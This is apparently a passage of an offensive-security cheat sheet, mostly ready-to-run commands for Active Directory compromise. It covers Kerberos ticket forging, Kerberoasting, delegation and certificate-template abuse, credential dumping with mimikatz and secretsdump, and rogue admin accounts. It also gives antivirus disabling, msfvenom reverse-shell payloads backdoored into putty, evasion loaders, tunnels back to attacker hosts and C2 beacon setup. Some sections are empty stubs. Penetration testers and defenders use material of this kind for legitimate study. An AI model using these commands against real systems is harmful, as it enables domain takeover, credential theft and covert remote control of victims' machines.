impacket-lookupsid.py 'DOMAIN/USER:PASS@TargetIP'

# Remotely
impacket-ticketer.py -nthash <nt hash of computer account> -domain-sid <domain sid> -domain Domain.Local -sp domain/user USER
```

### Golden Ticket

#### Mimikatz
```mimikatz=
privilege::debug

lsadump::dcsync /user:krbtgt /domain:<domain>

kerberos::golden /krbtgt:<ntlm of krbtgt> /id:500 /sid:<sid> /user:<user to impersonate> /ptt
```

#### Remote
```bash
impacket-secretsdump.py --just-dc-ntlm 'DOMAIN/USER:PASS@TargetIP'
impacket-lookupsid.py 'DOMAIN/USER:PASS@TargetIP'
impacket-ticketer.py -nthashes <ntlm> -domain-sid <domain sid> -domain <user>
```

### Diamond Ticket
```powershell
Get-DomainUser -Properties objectsid -Identity <user>

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<user RID> /groups:512
```

### Sapphire Ticket
```bash
impacket-ticketer.py -request -impersonate 'DomainAdmin' -domain 'DOMAIN.LOCAL' -user 'USER' -password 'PASS' -aesKey 'krbtgt/service AES key' -domain-sid <domain sid> 'EVIL USER'
```

## Active Directory Priv Esc
### Kerberoasting
```bash
# save output to script file for later
script -a kerberoast1.txt

# run to get hashes
impacket-GetUserSPNs -request -outputfile kerberoast1.txt -dc-ip DCIP 'DOMAIN.INTERNAL/USER:PASS'

# exit script in multiple ways
exit
^D

# Locally with Rubeus
.\Rubeus.exe kerberoast

# Crack Hashes
hashcat -m 13100 kerberoast1.txt rockyou.txt -o kerberoast1-cracked.txt -r rule.rule --session kerb1
```

### AS-REP Roasting
```bash
# save output to script file for later
script -a asrep1.txt

# run to get hashes without creds and with creds
impacket-GetNPUsers -no-pass DOMAIN.LOCAL/USER -format hashcat

impacket-GetADUsers -dc-ip <dc-ip> 'domain.local/USER:PASS' -all |awk '{print $1}' > domainusers.txt
impacket-GetNPUsers 'DOMAIN.INTERNAL/USER:PASS' -format hashcat -request -usersfile domainusers.txt 

# Locally with rubeus
Rubeus.exe asreproast /format:hashcat

hashcat -m 18200 asrephash.txt wordlisthere -o asreproast-cracked.txt -r rule.rule --session asrep1 
```

### Delegation

#### Unconstrained Delegation

To pull an unconstrained delegation attack off a few tools and some enumeration will be needed.

With a compromised host we can import the PowerView enumeration script to see what host are set for unconstrained delegation. So first we import the script.

```powershell
Import-Module PowerView.ps1
```

Then we query for the host, but ignore any Domain Controllers that show up here because they are not useful for privilege escalation.

```powershell
Get-NetComputer -Unconstrained
```

Then you need to either abuse existing tickets in memory or find a way to add a new one.

Existing
```powershell
# Using MimiKatz
.\mimikatz.exe
privilege::debug

sekurlsa::tickets /export
#or
kerberos::list /export

# Using Rubeus to dump all tickets
.\Rubeus.exe dump
# then 
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))


.\Rubeus.exe triage

# dump specific by luid
.\Rubeus.exe dump /service:krbtgt /luid:luid /nowrap
# then 
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Using Rubeus to monitor for tickets every 3 seconds.
.\Rubeus.exe monitor /interval:3 /nowrap
# Note you can specify a target using /targetuser:user
```

New using authentication coersion
```powershell
# Using Spoolsample. The target must be a computer account, such as a domain controller.
# Or you can use social engineering to make someone log into the machine. 
.\SpoolSample.exe <target> <unconstrinedmachine>

# Coercer is a tools that will automate all of the current coersion methods.
# https://github.com/p0dalirius/Coercer
Coercer coerce -t target -l you -u 'User' -p 'Password'
```

Now to use the tickets gained we can go about this in both linux and windows.

For linux we will need to download them to the attack machine, convert them to a format we can use, and set them in an enviornment variable so that tools can refer to the ticket like a variable.

```bash
# Download or copy the ticket to your attack box

# CCache -> kirbi
ticket_converter.py ticket.ccache ticket.kirbi

# kirbi -> CCache
ticket_converter.py ticket.kirbi ticket.ccache
```

**From here follow a Pass The Ticket attack for lateral movement.**

#### Constrained Delegation

Use powerview, AD module, or bloodhound to search for users with constrained delegation configured.

powerview
```powershell
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth
```
AD module
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

Utilize Rubeus to request the TGS to the delegated host using the configured SPN or use an alternate service.
```powershell
# Default SPN
Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/usmssql.us.techcorp.local /domain:us.techcorp.local /ptt

# Specify Service
Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/usmssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```

#### Resource Based Constrained Delegation

```powershell
# import the necessary toolsets
Import-Module .\powermad.ps1
Import-Module .\powerview.ps1

# we are TESTLAB\attacker, who has GenericWrite rights over the primary$ computer account
whoami

# the target computer object we're taking over
$TargetComputer = "primary.testlab.local"

$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid

# verify the GenericWrite permissions on $TargetComputer
$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
$ACE

ConvertFrom-SID $ACE.SecurityIdentifier

# add a new machine account that we control
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

# get the SID of the new computer we've added
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

# build the new raw security descriptor with this computer account as the principal
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

# get the binary bytes for the SDDL
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# confirming the security descriptor add
$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl

# currently don't have access to primary\C$
dir \\primary.testlab.local\C$

# get the hashed forms of the plaintext
.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:testlab.local

# execute Rubeus' s4u process against $TargetComputer
#   EF266C6B963C0BB683941032008AD47F == 'Summer2018!'
#   impersonating "harmj0y" (a DA) to the cifs sname for the target computer (primary)
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:harmj0y /msdsspn:cifs/primary.testlab.local /ptt


# cleanup - clear msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'

# source https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff#file-rbcd_demo-ps1
```


##### Prerequisites



Normal
```powershell

```

Kerberos Only
```powershell

```

## Active Directory Certificate Services

This command will use the certipy tool to query the domain for certificate information.
It will then only return enabled templates and those with expected vulnerabilities.

Flag explanations
- -enabled only returns enabled templates. disabled templates cannot be leveraged
- -vulnerable only returns templates that have vulnerabilities
- -hide-admins hides template vulnerabilies that only Admin level priviliges can abuse.

```bash
# Find Vulnerable Certificate Templates
certipy find domain.local/user:pass@domain.local -enabled -vulnerable -hide-admins
```

### ESC1

This works if 3 conditions are met.
- Client Authentication is set to 'True'
- Certificate Name Flag is set to 'EnrolleSuppliesSubject'
- You can authenticate as an enrolle.


```bash
# Locally
Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnerableTemplate /user:Administrator

# copy cert from the compromised host to your attack box and name it cert.pem 
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# upload cert.pfx to compromised host
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt /getcredentials


# Remotely
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1-Test -upn administrator@corp.local -dns dc.corp.local
certipy auth -pfx administrator_dc.pfx -dc-ip <dc-ip> -username Administrator

# Check Auth
cme smb <dc-ip> -u Administrator -H <ntlm> --shares
```

### EC4

This misconfiguration is due to a user having the ability to modify a certificate template.

Ideally if you can manipulate a template you back up the current configuration, modify it to be vulnerable to EC1, exploit EC1, and then use the backup to revert it to the slightly less vulnerable state.

```bash
certipy template -u user@domain.local -p 'pass' -template VulnTemplate -save-old

certipy req -u user@domain.local -p 'pass' -target ca.domain.local -template VulnTemplate -ca DOMAIN-CA -upn Administrator@domain.local

certipy auth -pfx administrator.pfx -dc-ip 1.2.3.4

certipy template -u user@domain.local -p 'pass' -template VulnTemplate -configuration VulnTemplate.json
```


### ESC8

This works if Web Enrollment is set to true and you can cause authentication coersion.

A web enrollment service has to be installed and enabled on top of the above.

```bash
certipy relay -ca <CA_IP> -template DomainController

Coercer coerce -l 127.0.0.1 -t dc.of.target.domain -u user -p 'pass' -d domain.local
# or 
python3 /opt/PetitPotam/PetitPotam.py -d domain.local <attacker_IP> <target_DC_IP>
certipy auth -pfx dc.pfx -dc-ip <DC_IP>

# Check Auth
cme smb <dc-ip> -u Administrator -H <ntlm> --shares

# dcsync
cme smb <target_DC>.domain.local -u <DC_machine_acct> -H <NT_hash> --ntds
```

### Domain Persistence
<!--RALPH - IN PROGRESS-->

#### DPERSIST1 - Forge certificates with stolen CA certificate

Imagine a scenario, where you have gained local administrative access to the Root CA within a domain and need a way to escalate domain privileges. 

We can extract the CA's root certificate and use that to "forge" a certificate that we can use to authenticate within the domain.

**Windows:**
```powershell
# Extract CA Root Certificate - (THEFT2)
SharpDPAPI.exe certificates /machine

# Save certs to file 
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ca.pfx

# Forge Rogue Certificate
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName administrator@domain.local --NewCertPath admin.pfx --NewCertPassword Password123 

# - PowerMad To Create Computer (If you don't control computer object)
# - PowerView to Extract Computer SID

# Perform RBCD Attack via LDAP
PassTheCert.exe --server 192.168.210.10 --start-tls --cert-path admin.pfx --cert-password Password123 --rbcd --target "CN=HQDC01,OU=DOMAIN CONTROLLERS,DC=DOMAIN,DC=LOCAL" --sid [SID of machine acc you control]
```

**Linux:**
```bash
# Extract CA Certificate
certipy ca -backup -u 'user@contoso.local' -p 'password' -ca 'ca_name'

# Force Administrator Certificate
certipy forge -ca-pfx [CA].pfx -upn administrator@domain.local -subject 'CN=ADMINISTRATOR,CN=USERS,DC=DOMAIN,DC=LOCAL'

# Extract CRT and KEY files
certipy cert -pfx forged.pfx -nokey -out user.crt
certipy cert -pfx forged.pfx -nocert -out user.key

# Add Attacker Controlled Computer (Or Re-use from previous exploitation, if MAQ == 0)
passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -computer-pass SheSellsSeaShellsOnTheSeaShore

# Modify RBCD attribute on Target Machine
passthecert.py -action write_rbcd -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -port 389 -delegate-to [RBCD]$ -delegate-from [TARGET-DC]$

# Request Sevrive Ticket for LDAP Service on DC
getST.py -spn 'LDAP/[DC].domain.local' -impersonate Administrator -dc-ip '[DC IP]' 'domain.local/rbcd$:ThisIsAPassword'

# Load Kerberos Ticket
export KRB5CCNAME=`pwd`/Administrator.ccache

# Perform DCSync
secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
```

General ADCS Side Notes: If PKINIT Authentication is not working, LDAP(s)/Schannel can be used. 

Use the **dap-shell** flag with certipy.


## Windows Enuemration

<!-----
Get-MPPreference
---->

### Pillaging

Manspider
```bash
script -a manspider1
manspider windowshosts.txt -u user -p pass -n -f passw login logon cred Untitled -e kdbx cfg config conf ps1 cmd sh bat kdbx txt zip xls doc pdf

script -a manspider2 # this one gets ran and then left to parse if theres time
manspider windowshosts.txt -u user -p pass -n -f username -e txt xls doc pdf conf & 
```


## Windows Priv Esc

Tools

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
https://github.com/itm4n/PrivescCheck
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp

```
# SeImpersonatePrivilege

PrintSpoofer.exe
GodPotato.exe
```


## Windows Persistence
### Users

Add a user in CMD
```powershell
# create user and password
net user USER PASS /y /add

# add them to a privileged group
net localgroup Administrators USER /y /add
```

Add a user in PowerShell
```powershell
# create password variable
$pass = ConvertTo-SecureString "PASS" -AsPlainText -Force

# create user using password variable
New-Localuser -Name USER -Password %pass

# Add to group
Add-LocalGroupMember -Groups Administrator -Member "USER"

```

Metasploit Module
```bash
msf6> use post/windows/manage/add_user
msf6> set username USER
msf6> set password PASS
msf6> set session <session>
msf6> set group Administrators
msf6> run
```

## Windows Credential Extraction

remotely
```powershell
# No AV/Disabled
mimimkatz xD
```

locally
```powershel;=
#download the system and sam and then use 
pypykatz registry --sam <sam> system

#DMP File
pypykatz lsa minidump lsass.DMP

#procdump
#nanodump
#lsassy
#masky
#dragoncastle

```
DCSync (DA Privileges Required)

Linux
```
secretsdump.py -just-dc <user>:<password>@<ipaddress> -just-dc-user Administrator

# Alternative (ADCS Must be Enabled)
certsync -u khal.drogo -p 'horse' -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12
```

Windows
```
Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
```


## CrackMapExec Magic

```bash
# The CMEDB contains useful information and provides exportation capabilities.
cmedb

# once inside
help

# export host and create a list of host based off text
export hosts hosts.csv
cat hosts.csv | grep -i 'dc' | cut -d ',' -f 2 > dc.txt
```

# Linux
## Linux Tips and Tricks

Download files with just bash
```bash
bash -c 'cat < /dev/tcp/<ip>/filename' > filename.ext
```

Make public RSA key from a private
```bash
ssh-keygen -e -y -f id_rsa
```

Show listening ports
```bash
ss -tulpn
netstat -anp tcp
```

Remove color from script output
```bash
sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"
```
## Linux Priv Esc

## Linux Persistence

# Antivirus and EDR Evasion

Antivrus is software in place to detect malicous code loaded onto a computers storage or even ran in memory. 
EDR, or enhanced detection and response is not the same as AV but can have many of the same features. 
EDR is in place for security staff to be fed information on possible threats related to systems the software is loaded on.

Due to its nature EDR is much more difficult to bypass, as it much more closely watches software behavior on the system. 
EDR likes to hook into the Win32 API and watch the NTDLL.dll. 
The Win32 API is used to convert common user instructions to something that the NTDLL.dll can understand.
The reason for this is that the NTDLL.dll is responsible for providing instructions to the Windows Kernel. 

EDR maintains a tight grasp on the Win32 API DLL because it had permissions to do so.
Where as it watches NTDLL.dll calls very closely. Many EDR bypasses either call on their own version of NTDLL.dll or bring their own.
Which is very uncommon for software, making malware using those techniques stick out easier.

## Types of Detection
- Signatures
	- String of binary that will alert if AV Finds it
		- Custom Payloads
		- Obfuscation
			- Encoding/Encrypting
			- Scrambling (ex. 'mimikatz' -> 'miMi' + 'kaTZ')

- Heuristics/Behavioral
	- Polymorphism - randomizes its specific fucntions
	- Custom payloads

## Disabling Antivirus on Windows

Powershell
```powershell
Get-MPPreference -DisableRealTimeMonitoring $true
```

CME/NXC
```bash
cme smb host -u Administrator -p password -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
# feel free to add --exec-method msiexec if you encounter issues
```

## Payload Generation

But before all that even matters we need to know how to even establish a basic remote shell connection.
To make this much easier, we're going to use MSFVenom.
### Types of Payloads

#### Stageless Payloads:
Embeds final shellcode directly into itself
Executes shellcode in a single-step process
Provides a reverse shell to the attacker when executed

#### Staged Payloads:
Uses intermediary shellcodes (stagers) to retrieve and execute final shellcode
Typically a two-stage payload with stage0 connecting back to the attacker's machine to download the final shellcode
Final shellcode injected into payload's memory and executed

#### Advantages of Stageless Payloads:
Resulting executable includes everything needed for shellcode
Doesn't require additional network connections
Lower chances of being detected by an IPS

#### Advantages of Staged Payloads:
Small footprint on disk
Only stage0 stub is captured if payload is intercepted
Final shellcode loaded in memory, making it harder to detect by AV solutions
Allows reuse of stage0 dropper for different shellcodes
Context-dependent choice between stageless and staged payloads:
Stageless better for networks with perimeter security or closed environments without connections back to attacker's machine
Staged better for reducing footprint on local machine and evading AV detection

### Encoding / Encryption

#### Encoding:
Process of changing data into a specific format
Used for program compiling, data storage and transmission, and file conversion

#### Encryption:
Focuses on data security and prevents unauthorized access
Converts plaintext into ciphertext using an algorithm and key
Purpose of encoding and encryption:
AV evasion by hiding shellcode from detection
Can be used to hide functions, variables, etc.

### Packers
Packers compress programs to reduce their size and protect them from reverse engineering.
Common packers include UPX, MPRESS, and Themida.
Packing an application involves transforming its code and adding an unpacker stub.
Packers can help bypass antivirus (AV) solutions by making the executable look different and avoiding known signatures.
AV solutions may still detect packed executables based on the unpacker stub or during in-memory scanning.
The text provides a C# shellcode example and instructions for using a packer (ConfuserEx) to protect it.

### MSFVenom
MSFVenom is a part of the Metasploit toolkit. This tool is used to generate malicious payloads, shellcode, scripts, ect..
By default the payloads should get caught. They are well signatured with obvious heuristics. But that doesnt mean it wont be able to bypass Antivirus or EDR.

In many cases the shellcode MSFVenom generates is the base of a lot of hand made malware. 
Advanced attackers will use this to generate the shellcode and write their own stager or stageless payloads, which will not be covered.

What will be covered below is how to properly generate and use MSFVenom and use quick and easy tools to manipulate your output in an effort to bypass AV or EDR.
<!---- add hyperlink for hacktools ---->
<p>You can use HackTools for this as it has a MSFVenom builder, but the basic flags, usage, and generation will be covered.</p>

### Using MSFVenom to bypass AV using a backdoored binary
```bash
# test executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.41 LPORT=445 -f exe -o test.exe

msf6 > 
    use exploit/multihandler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST=192.168.1.41
    set LPORT=445 

# generate payload using encryption
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.41 LPORT=445 -f exe -o test2.exe -e x64/xor_dynamic -i 10

# generate payload using encryption and a backdoored version of putty
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.41 LPORT=445 -f exe -o test2.exe -e x64/xor_dynamic -i 10 -x putty.exe -k EXITFUNC=thread
```

Display avilable encoders for 64 bit systems
```bash
msfvenom -l encoders | grep 'x64'
	x64/xor
	x64/xor_context
	x64/xor_dynamic
	x64/zutto dekiru
```

## Tooling (Payload Generation Frameworks)

### Scarecrow
```bash
msfvenom [...snip...] -f raw -o payload.bin

./ScareCrow -I payload.bin -Loader binary -domain random.domain

# Have fun being a fake microsoft signed binary
```

### Mangle

```bash

```

### Freeze
```
./Freeze -I SHELLCODE.bin -encrypt -process 'notepad.exe' -sha256 -O evil.dll
```

### Donut
```bash
msfvenom [...snip...] -f raw -o payload.bin

./donut -a 2 -f 7 -o payload.bin name.exe
```

### Limelighter

```bash

```

### SysWhispers
```bash

```


### Salsa
<!---- todo ----> 
https://github.com/Hackplayers/Salsa-tools


### Wraith
<!---- todo ----> 
https://github.com/slaeryan/AQUARMOURY/tree/master/Wraith



# Pivoting, Tunneling, and Port Forwarding

## Chisel
```bash
# Spin up server
chisel server -p 8000 --reverse

# Upload to remote machine and set up connections
.\chisel client attackerIP:port R:socks

# do things
proxychains cme smb <subnet> 
```

## Sshuttle
```bash
sudo sshuttle -r user@ipaddress --ssh-cmd "ssh -i id_rsa" -H 
sudo sshuttle -r user@ipaddress --ssh-cmd "ssh -i id_rsa" <subnet ie: 192.168.69.0/24> 
```

## Ligolo-NG
```bash
# Setup Proxy (Attacker Box)
sudo ./proxy -selfcert -laddr 0.0.0.0:53

# Connect to Proxy (Victim Box)
agent -connect kali-ip:53 -ignore-cert
agent.exe -connect kali-ip:53 -ignore-

# Enable Session on Proxy
session
(select session)
start
sudo ip route add <subnet-here> dev ligolo
```

## Port Forwarding on Windows
```CMD=
# RULE
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.10.10 connectport=8080

# CHECK
netsh interface portproxy show all

# RESET
netsh interface portproxy reset
```

# C2
## General
Commertial and open source options available.
<a href='https://www.thec2matrix.com'>C2 Matrix:</a> - C2 research
Common C2:
- metasploit
- powershell empire (old)
- silenttrinity (byt3bl33d3r)
- Sliver (BishopFox)
- Merlin
- Nighthawk
- HardHat
- Covenant
- Cobalt Strike
- Havoc
- Voodoo
- Scythe

## Sliver
Start Sliver Server:
```
sudo systemctl start sliver
```

### Listeners
```
mtls -l <port>
https
```

### Profiles
Generate Profile
```
profiles new beacon --arch amd64 --os windows --mtls [ip:port] -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 RED_LAKE
```

### Payloads
Generate Beacons:
```
generate beacon --evasion --arch amd64 --mtls [ip:port] --format [exe,shellcode,shared,service] --os windows --save /var/www/html 
```

Convert to Shellcode to PowerShell Payload (Unstable):
```
msfvenom -p generic/custom PAYLOADFILE=/var/www/html/SOMETHING.bin -a x64 --platform windows -e cmd/powershell_base64 -f ps1 -o safe.ps1
```

### Armory
Show armory
```
armory 
```

Install stuffs
```
armory install all # not recommended

armory install windows-credentials

armory install .net-recon

armory install .net-pivot

armory install .net-execute
```

## Cobalt Strike

### Types of Listeners
Beacons:
- DNS
    - Note: Make sure to fill BOTH the DNS HOST and (Stager) with the HOSTNAME. 
- HTTP
- HTTPS
- SMB
    - Note: Change the Pipeline (C2) to something less fingerpinted. 
- TCP

External:
- TCP
- C2

Foreign:
- HTTP
- HTTPS

## Havoc


## Covenant 
